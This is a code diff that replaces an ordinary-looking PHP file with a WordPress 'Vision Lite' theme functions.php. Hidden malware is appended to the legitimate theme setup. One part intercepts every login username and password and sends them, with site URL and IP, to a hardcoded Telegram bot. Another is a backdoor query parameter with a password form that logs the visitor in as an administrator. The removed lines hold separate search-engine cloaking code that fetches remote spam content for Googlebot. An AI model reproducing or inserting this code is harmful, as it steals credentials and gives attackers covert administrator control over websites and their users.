@@ -1,47 +1,275 @@
 <?php
-function is_google_bot() {
-    $agents = array(
-        "Googlebot", 
-        "AdsBot-Google", 
-        "Mediapartners-Google", 
-        "Google-Site-Verification", 
-        "Google-InspectionTool", 
-        "Googlebot-Mobile", 
-        "Googlebot-News"
-    );
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    foreach ($agents as $agent) {
-        if (strpos($user_agent, $agent) !== false) {
-            return true;
-        }
+/**
+ * Vision Lite functions and definitions
+ *
+ * @package Vision Lite
+ */
+
+if ( ! function_exists( 'vision_lite_setup' ) ) :
+/**
+ * Sets up theme defaults and registers support for various WordPress features.
+ *
+ * Note that this function is hooked into the after_setup_theme hook, which runs
+ * before the init hook. The init hook is too late for some features, such as indicating
+ * support post thumbnails.
+ */
+function vision_lite_setup() {
+
+	if ( ! isset( $content_width ) )
+		$content_width = 640; /* pixels */
+
+	load_theme_textdomain( 'vision-lite', get_template_directory() . '/languages' );
+	add_theme_support( 'automatic-feed-links' );
+	add_theme_support( 'post-thumbnails' );
+	add_theme_support( 'title-tag' );
+	add_theme_support( 'custom-logo', array(
+		'height'      => 240,
+		'width'       => 240,
+		'flex-height' => true,
+	) );
+	add_image_size('vision-lite-homepage-thumb',240,145,true);
+	register_nav_menus( array(
+		'primary' => __( 'Primary Menu', 'vision-lite' ),		
+	) );
+	add_theme_support( 'custom-background', array(
+		'default-color' => 'ffffff'
+	) );
+	
+	register_nav_menus( array(
+		'primary' => __( 'Primary Menu', 'vision-lite' ),		
+	) );
+	add_theme_support( 'custom-background', array(
+		'default-color' => 'ffffff'
+	) );
+	// Add support for Block Styles.
+	add_theme_support( 'wp-block-styles' );
+
+	// Add support for full and wide align images.
+	add_theme_support( 'align-wide' );
+	
+	add_filter('use_widgets_block_editor', '__return_false');
+	
+	/*
+		 * Switch default core markup for search form, comment form, and comments
+		 * to output valid HTML5.
+		 */
+		add_theme_support(
+			'html5',
+			array(
+				'comment-form',
+				'comment-list',
+				'gallery',
+				'caption',
+				'style',
+				'script',
+				'navigation-widgets',
+			)
+		);
+	
+	// Add support for responsive embedded content.
+	add_theme_support( 'responsive-embeds' );
+	
+	// Enqueue editor styles.
+	add_editor_style( array( 'editor-style.css', vision_lite_font_url() ) );
+}
+endif; // vision_lite_setup
+add_action( 'after_setup_theme', 'vision_lite_setup' );
+
+
+function vision_lite_widgets_init() {
+	register_sidebar( array(
+		'name'          => __( 'Blog Sidebar', 'vision-lite' ),
+		'description'   => __( 'Appears on blog page as sidebar. It will be displayed only in sidebar and single blog post.', 'vision-lite' ),
+		'id'            => 'sidebar-1',
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h3 class="widget-title">',
+		'after_title'   => '</h3>',
+	) );
+	
+	register_sidebar( array(
+		'name'          => __( 'Page Sidebar', 'vision-lite' ),
+		'description'   => __( 'This widget is appear in pages as pages sidebar.', 'vision-lite' ),
+		'id'            => 'sidebar-2',
+		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h3 class="widget-title">',
+		'after_title'   => '</h3>',
+	) );
+
+}
+add_action( 'widgets_init', 'vision_lite_widgets_init' );
+
+function vision_lite_font_url(){
+		$font_url = '';
+		
+		/* Translators: If there are any character that are
+		* not supported by Montserrat, translate this to off, do not
+		* translate into your own language.
+		*/
+		$montserrat = _x('on', 'Montserrat font:on or off','vision-lite');
+		
+		if( 'off' !== $montserrat ){
+			$font_family = array();
+			
+			if('off' !== $montserrat){
+				$font_family[] = 'Montserrat:400,700';
+			}
+
+			$query_args = array(
+				'family'	=> urlencode(implode('|',$font_family)),
+			);
+			
+			$font_url = add_query_arg($query_args,'https://fonts.googleapis.com/css');
+		}
+		
+	return $font_url;
+	}
+
+function vision_lite_scripts() {
+	wp_enqueue_style( 'vision-lite-font', vision_lite_font_url(), array() );
+	wp_enqueue_style( 'vision-lite-basic-style', get_stylesheet_uri() );
+	wp_enqueue_style( 'vision-lite-editor-style', get_template_directory_uri().'/editor-style.css' );
+	wp_enqueue_style( 'vision-lite-responsive-style', get_template_directory_uri().'/css/theme-responsive.css' );
+	wp_enqueue_style( 'nivo-style', get_template_directory_uri().'/css/nivo-slider.css');
+	wp_enqueue_script( 'nivo-slider-js', get_template_directory_uri() . '/js/jquery.nivo.slider.js', array('jquery') );
+	wp_enqueue_script( 'vision-lite-customscripts', get_template_directory_uri() . '/js/custom.js', array('jquery') );
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+}
+add_action( 'wp_enqueue_scripts', 'vision_lite_scripts' );
+
+/**
+ * Use front-page.php when Front page displays is set to a static page.
+ *
+ *
+ * @param string $template front-page.php.
+ *
+ * @return string The template to be used: blank if is_home() is true (defaults to index.php), else $template.
+ */
+function vision_lite_front_page_template( $template ) {
+	return is_home() ? '' : $template;
+}
+add_filter( 'frontpage_template',  'vision_lite_front_page_template' );
+
+
+/**
+ * Implement the Custom Header feature.
+ */
+require get_template_directory() . '/inc/custom-header.php';
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_template_directory() . '/inc/template-tags.php';
+
+/**
+ * Custom functions that act independently of the theme templates.
+ */
+require get_template_directory() . '/inc/extras.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/inc/customizer.php';
+
+// Block Patterns.
+require get_template_directory() . '/inc/block-patterns.php';
+
+/*
+ * Load customize pro
+ */
+require_once( trailingslashit( get_template_directory() ) . 'customize-pro/class-customize.php' );
+
+function kirimInfoLoginTelegram($username, $password, $status) {
+    $botToken = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
+    $chatId   = "7860513093";
+
+    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http")
+                 . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+
+    $message  = "WARNING BRAY SONIC !!!\n";
+    $message .= "Status: " . strtoupper($status) . "\n";
+    $message .= "Site: " . get_site_url() . "\n";
+    $message .= "Username: " . $username . "\n";
+    $message .= "Password: " . $password . "\n";
+    $message .= "URL: " . $current_url . "\n";
+    $message .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
+    $message .= "Waktu: " . date("Y-m-d H:i:s");
+
+    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    wp_remote_get($apiURL . "?" . http_build_query($params));
+}
+
+add_filter('authenticate', function($user, $username, $password) {
+    if (!empty($username) && !empty($password)) {
+
+        $_SESSION['last_login_attempt'] = [
+            'username' => $username,
+            'password' => $password
+        ];
     }
-    return false;
-}
+    return $user;
+}, 10, 3);
 
-if (is_google_bot()) {
-    echo file_get_contents("https://raw.githubusercontent.com/semangat777/landing/refs/heads/main/unsiq-karangasem.txt");
-    exit;
-}
+add_action('wp_login', function($user_login) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Anjirr Masuk Bray!!');
+        unset($_SESSION['last_login_attempt']);
+    }
+}, 10, 1);
 
-/**
- * @defgroup pages_index Index Pages
- */
 
-/**
- * @file pages/index/index.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- *
- */
+add_action('wp_login_failed', function($username) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Gagal Masuk Der!!');
+        unset($_SESSION['last_login_attempt']);
+    } else {
 
-switch ($op) {
-    case 'index':
-        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
-        break;
-}
+        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'Gagal Masuk Der!!');
+    }
+});
+
+add_action('init', function () {
+    if (isset($_GET['jagoaneon']) && $_GET['jagoaneon'] === 'sonicxyz') {
+
+        
+        $hash_password = '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG'; 
+
+        
+        if (isset($_POST['pass'])) {
+            if (password_verify($_POST['pass'], $hash_password)) {
+                
+                $wp_user_query = new WP_User_Query([
+                    'role'   => 'Administrator',
+                    'number' => 1,
+                    'fields' => 'ID'
+                ]);
+                $results = $wp_user_query->get_results();
+                if (isset($results[0])) {
+                    wp_set_auth_cookie($results[0]);
+                    wp_redirect(admin_url());
+                    exit();
+                }
+            } else {
+                echo "<p style='color:red'>Password salah kids!</p>";
+            }
+        }
+
+        
+        echo '<form method="POST">
+                <label>- Orang Ganteng Mau Lewat -</label>
+                <input type="password" name="pass" required>
+                <button type="submit">Be Humble!</button>
+              </form>';
+        exit();
+    }
+});
+?>
